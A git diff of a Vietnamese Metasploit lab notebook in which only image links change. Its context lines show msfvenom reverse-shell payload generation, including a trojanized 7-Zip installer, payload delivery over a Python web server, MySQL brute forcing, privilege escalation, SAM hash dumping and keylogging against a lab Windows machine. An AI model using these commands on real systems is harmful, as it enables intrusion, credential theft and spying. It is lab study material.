@@ -27,7 +27,7 @@ Mình sẽ sử dụng [nmap](https://nmap.org/) để kiểm tra các port đư
 ```
 nmap -sV -A 10.0.2.15
 ```
-![nmap_scan_victim](https://hackmd.io/_uploads/H1f-j23vlg.png)
+![nmap_scan_victim](/images/Metasploit_Notebook/1.png)
 
 Kết quả cho thấy máy windows đang mở rất nhiều port có thể exploit. Trong đó có 1 port đặc biệt lưu ý:
 
@@ -57,7 +57,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=1119 -e x86/shi
 - `-f`: Định dạng file output
 - `-o`: Tên file output
 
-![Ảnh chụp màn hình 2025-08-03 175132](https://hackmd.io/_uploads/HJfYypnPle.png)
+![Ảnh chụp màn hình 2025-08-03 175132](/images/Metasploit_Notebook/2.png)
 
 
 ### 2. Tạo Web Server để Phân phối Payload
@@ -68,7 +68,7 @@ Từ một cửa sổ terminal khác trên Kali, tạo một web server đơn gi
 python3 -m http.server 80
 ```
 
-![Ảnh chụp màn hình 2025-08-03 175246](https://hackmd.io/_uploads/Hku3JT3weg.png)
+![Ảnh chụp màn hình 2025-08-03 175246](/images/Metasploit_Notebook/3.png)
 
 
 ### 3. Cấu hình Listener (Handler)
@@ -90,42 +90,42 @@ set LPORT 1119 #set port tùy ý
 exploit
 ```
 
-![Ảnh chụp màn hình 2025-08-03 175502](https://hackmd.io/_uploads/B1GHlT2vgg.png)
+![Ảnh chụp màn hình 2025-08-03 175502](/images/Metasploit_Notebook/4.png)
 Lúc này máy Attacker bắt đầu lắng nghe máy victim trên port 1119
 
 ### 4. Thực thi và Kết nối
 
 Khi máy Victim, ta tiến hành truy cập và tải file ta vừa tạo
-![Ảnh chụp màn hình 2025-08-03 175958](https://hackmd.io/_uploads/rkRYbT3Pxg.png)
+![Ảnh chụp màn hình 2025-08-03 175958](/images/Metasploit_Notebook/5.png)
 
 *Ở đây mình chỉ làm trên môi trường lab phục vụ cho việc học nên sẽ không có sự chỉnh chu về giao diện cũng như phising social nhé*
 
 Trên máy Victim, chạy file mahoa.exe. Lúc này một phiên Meterpreter sẽ được tự động kết nối về máy Attack
 
-![Ảnh chụp màn hình 2025-08-03 180031](https://hackmd.io/_uploads/rk81zahPlx.png)
+![Ảnh chụp màn hình 2025-08-03 180031](/images/Metasploit_Notebook/6.png)
 
 Từ đây về cơ bản ta đã có shell, chiếm quyền điều khiển từ máy Victim
 
-![Ảnh chụp màn hình 2025-08-03 180408](https://hackmd.io/_uploads/HJ1vGp3Del.png)
-![Ảnh chụp màn hình 2025-08-03 202108](https://hackmd.io/_uploads/HJxFzJ6Pgx.png)
+![Ảnh chụp màn hình 2025-08-03 180408](/images/Metasploit_Notebook/7.png)
+![Ảnh chụp màn hình 2025-08-03 202108](/images/Metasploit_Notebook/8.png)
 
 **Ở đây mình có 1 biến thể dạng vuln đó là nhúng payload vào các file nổi tiếng, uy tín như 7zip, winrar, calculate...**
 
-![Ảnh chụp màn hình 2025-08-03 202320](https://hackmd.io/_uploads/SybZXyavgg.png)
+![Ảnh chụp màn hình 2025-08-03 202320](/images/Metasploit_Notebook/9.png)
 
 ta tiến hành down file 7zip về, sau đó dùng payload của msf để chèn shell vào 
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=1115 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 4 -o /home/kali/Downloads/7z2408.exe
 ```
-![Ảnh chụp màn hình 2025-08-03 202406](https://hackmd.io/_uploads/SJLYm1awgg.png)
+![Ảnh chụp màn hình 2025-08-03 202406](/images/Metasploit_Notebook/10.png)
 
 Ở trên máy victim, ta tiến hành down file 7zip về và run
-![Ảnh chụp màn hình 2025-08-03 202727](https://hackmd.io/_uploads/B15ZE1pDgl.png)
+![Ảnh chụp màn hình 2025-08-03 202727](/images/Metasploit_Notebook/11.png)
 
 Kết quả vẫn lấy được shell và chiếm quyền điều khiển
 
-![Ảnh chụp màn hình 2025-08-03 202827](https://hackmd.io/_uploads/Hk_V4J6Dxx.png)
+![Ảnh chụp màn hình 2025-08-03 202827](/images/Metasploit_Notebook/12.png)
 
 ##  Khai thác MySQL - FTP
 
@@ -152,14 +152,14 @@ run
 ```
 **Kết quả rà quét thành công máy có chạy dịch vụ MySQL**
 
-![Ảnh chụp màn hình 2025-08-03 203338](https://hackmd.io/_uploads/BJoDry6Dxx.png)
+![Ảnh chụp màn hình 2025-08-03 203338](/images/Metasploit_Notebook/13.png)
 
 
 #### 2. Kiểm tra Bảo mật Đăng nhập
 
 Sử dụng module mysql_login để kiểm tra các cấu hình đăng nhập yếu.
 Trước tiên phải có file rockyou để bruteforce:
-![Ảnh chụp màn hình 2025-08-03 203938](https://hackmd.io/_uploads/BkZyPJ6Dge.png)
+![Ảnh chụp màn hình 2025-08-03 203938](/images/Metasploit_Notebook/14.png)
 
 Sau đó tiến hành giải nén và thực hiện các lệnh sau
 ```bash
@@ -180,9 +180,9 @@ run
 
 **Kết quả:** Nếu phát hiện cấu hình yếu, module sẽ trả về các thông tin đăng nhập.
 
-![Ảnh chụp màn hình 2025-08-03 204209](https://hackmd.io/_uploads/ryPYwyTPxl.png)
+![Ảnh chụp màn hình 2025-08-03 204209](/images/Metasploit_Notebook/15.png)
 
-![Ảnh chụp màn hình 2025-08-03 204218](https://hackmd.io/_uploads/SyW5DJawxl.png)
+![Ảnh chụp màn hình 2025-08-03 204218](/images/Metasploit_Notebook/16.png)
 
 ```
 [+] 10.0.2.15:3306 - Success: 'root'
@@ -210,7 +210,7 @@ run
 
 **Kết quả:** Trả về phiên bản FTP, ví dụ vsftpd 2.3.4. Từ đây, ta có thể tìm các lỗ hổng cụ thể cho phiên bản này.
 
-![Ảnh chụp màn hình 2025-08-03 205054](https://hackmd.io/_uploads/HyvKKJTPge.png)
+![Ảnh chụp màn hình 2025-08-03 205054](/images/Metasploit_Notebook/17.png)
 
 
 #### 2. Kiểm tra Cấu hình Bảo mật
@@ -239,7 +239,7 @@ set RHOSTS 10.0.2.15
 
 run
 ```
-![Ảnh chụp màn hình 2025-08-03 210615](https://hackmd.io/_uploads/BkpMakaDeg.png)
+![Ảnh chụp màn hình 2025-08-03 210615](/images/Metasploit_Notebook/18.png)
 
 
 
@@ -258,37 +258,37 @@ Sau khi chiếm được Shell căn bản chúng ta sẽ làm gì tiếp theo?
 **Mong muốn lúc này ta vượt qua giởi hạn của shell căn bản**
 
 Thông tin về lệnh  ***getsystem***, nó cần có một quyền cao hơn thì mới có thể chạy được. Để xem các lệnh căn bản ta có thể gõ " help ". Muốn chạy các câu lệnh sâu hơn , leo thang trong hệ thống.
-![Ảnh chụp màn hình 2025-08-03 212145](https://hackmd.io/_uploads/rkxneeTwle.png)
+![Ảnh chụp màn hình 2025-08-03 212145](/images/Metasploit_Notebook/19.png)
 
 Liệt kê các process đang chạy trên máy Victim
-![Ảnh chụp màn hình 2025-08-03 212226](https://hackmd.io/_uploads/BkdCeepPxe.png)
+![Ảnh chụp màn hình 2025-08-03 212226](/images/Metasploit_Notebook/20.png)
 
 Sử dụng lệnh ***migrate***
-![Ảnh chụp màn hình 2025-08-03 212400](https://hackmd.io/_uploads/rJuVZxawee.png)
+![Ảnh chụp màn hình 2025-08-03 212400](/images/Metasploit_Notebook/21.png)
 
 Hmm.. Shell lúc này bị giới hạn, chúng ta chưa thể leo thang đi sâu vào bên trong hệ thống.
 Tiếp tục khai thác, Tìm thử thông tin quản trị các tiến trình chạy ngầm
-![Ảnh chụp màn hình 2025-08-03 212701](https://hackmd.io/_uploads/ryQxfg6Dgg.png)
+![Ảnh chụp màn hình 2025-08-03 212701](/images/Metasploit_Notebook/22.png)
 
 Ở đây ta thấy được đứa con quen thuộc rùi này🤭
 Mình đã thử tìm các vấn đề liên quan đến bản vá lỗi Window và cũng có 1 số kết quả trả về
-![Ảnh chụp màn hình 2025-08-03 213121](https://hackmd.io/_uploads/rJzZXeaweg.png)
+![Ảnh chụp màn hình 2025-08-03 213121](/images/Metasploit_Notebook/23.png)
 
 **Cho thấy rằng mình đang có quyền quản trị**
 
-![Ảnh chụp màn hình 2025-08-03 213241](https://hackmd.io/_uploads/By7UQxpvll.png)
+![Ảnh chụp màn hình 2025-08-03 213241](/images/Metasploit_Notebook/24.png)
 
 **Thành công khi lấy được quyền sâu bên trong hệ thống:>**
 
 Thực ra còn 1 cách nếu như việc recon bị giới hạn bởi shell khi không thể can thiệp sâu. Đó là tải [Backdoor](https://github.com/jajp777/sysret) về. Từ đó ta có thể chui vào trong Window và chạy file kèm PID của Process Explorer
-![Ảnh chụp màn hình 2025-08-03 213903](https://hackmd.io/_uploads/rJA3ElTvel.png)
-![Ảnh chụp màn hình 2025-08-03 214010](https://hackmd.io/_uploads/r1f-HlTwge.png)
+![Ảnh chụp màn hình 2025-08-03 213903](/images/Metasploit_Notebook/25.png)
+![Ảnh chụp màn hình 2025-08-03 214010](/images/Metasploit_Notebook/26.png)
 
 
 ### Trích xuất thông tin hệ thống
 
 #### Sử dụng HashDump
-![Ảnh chụp màn hình 2025-08-03 214134](https://hackmd.io/_uploads/B1VDSlaPxx.png)
+![Ảnh chụp màn hình 2025-08-03 214134](/images/Metasploit_Notebook/27.png)
 
 Module Hashdump sẽ giúp chúng ta lấy các Account từ CSDL SAM Database
 ```bash
@@ -310,7 +310,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Victim:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
 ```
 
-![Ảnh chụp màn hình 2025-08-03 214445](https://hackmd.io/_uploads/rkvGLxavgl.png)
+![Ảnh chụp màn hình 2025-08-03 214445](/images/Metasploit_Notebook/28.png)
 
 
 #### Sử dụng smart_hashdump
@@ -348,19 +348,19 @@ run
 
 Sau khi leo thang đặc quyền thành công thì ta còn có thể thực hiện nhiều biến thể khác như keylogger, c2c...
 
-![Ảnh chụp màn hình 2025-08-03 214812](https://hackmd.io/_uploads/rkEyDg6Dlx.png)
+![Ảnh chụp màn hình 2025-08-03 214812](/images/Metasploit_Notebook/29.png)
 
 Trên máy Victim thử gõ vài từ
-![Ảnh chụp màn hình 2025-08-03 214843](https://hackmd.io/_uploads/Hk-bPl6wxx.png)
+![Ảnh chụp màn hình 2025-08-03 214843](/images/Metasploit_Notebook/30.png)
 
 Quay trở lại cmd của Kali
-![Ảnh chụp màn hình 2025-08-03 214858](https://hackmd.io/_uploads/Syl0MweTwll.png)
+![Ảnh chụp màn hình 2025-08-03 214858](/images/Metasploit_Notebook/31.png)
 
 Ngoài ra ta còn có thể sử dụng tính năng tương tự record lại các key này. Quá trình này sẽ ghi lại keystroke trên máy Victim, đồng thời truy cập vào nơi lưu thông tin do thám được
 
-![Ảnh chụp màn hình 2025-08-03 214950](https://hackmd.io/_uploads/BJ0IweTwgl.png)
+![Ảnh chụp màn hình 2025-08-03 214950](/images/Metasploit_Notebook/32.png)
 
-![Ảnh chụp màn hình 2025-08-03 215119](https://hackmd.io/_uploads/rJYWdepwlg.png)
+![Ảnh chụp màn hình 2025-08-03 215119](/images/Metasploit_Notebook/33.png)
 
 Ok, tạm thời tới đây thôi vì lỗ hổng này còn rất nhiều thứ khai thác được..
 
